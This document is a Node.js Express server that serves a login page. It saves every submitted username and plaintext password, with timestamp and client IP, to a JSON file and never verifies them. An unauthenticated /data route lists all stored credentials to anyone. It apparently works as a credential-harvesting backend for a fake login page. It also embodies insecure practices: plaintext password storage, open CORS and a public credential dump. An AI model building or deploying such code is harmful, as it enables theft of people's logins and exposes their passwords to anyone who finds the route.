const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, "data", "logins.json");

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
const cors = require("cors");
app.use(cors());
app.use(express.static(path.join(__dirname, "public")));

// Ensure data file exists
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
  console.log("📁 Created data/logins.json");
}

// Serve the login page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Handle login form submission
app.post("/login", (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res
      .status(400)
      .json({ success: false, message: "All fields are required." });
  }

  // Read existing data
  let logins = [];
  try {
    const raw = fs.readFileSync(DATA_FILE, "utf8");
    logins = JSON.parse(raw);
  } catch (err) {
    logins = [];
  }

  // Append new entry
  const newEntry = {
    id: logins.length + 1,
    username: username.trim(),
    password: password,
    timestamp: new Date().toISOString(),
    ip: req.ip || "unknown",
  };

  logins.push(newEntry);

  // Write back to file
  fs.writeFileSync(DATA_FILE, JSON.stringify(logins, null, 2));

  console.log(
    `✅ Login saved — User: ${username} | Time: ${newEntry.timestamp}`,
  );

  return res.json({ success: true, message: "Login saved successfully!" });
});

// View all saved logins (optional admin route)
app.get("/data", (req, res) => {
  try {
    const raw = fs.readFileSync(DATA_FILE, "utf8");
    const logins = JSON.parse(raw);
    res.json({ total: logins.length, logins });
  } catch {
    res.json({ total: 0, logins: [] });
  }
});

app.listen(PORT, () => {
  console.log(`\n🚀 Server running at: http://localhost:${PORT}`);
  console.log(`📂 Data saved to: data/logins.json`);
  console.log(`📊 View saved data: http://localhost:${PORT}/data\n`);
});
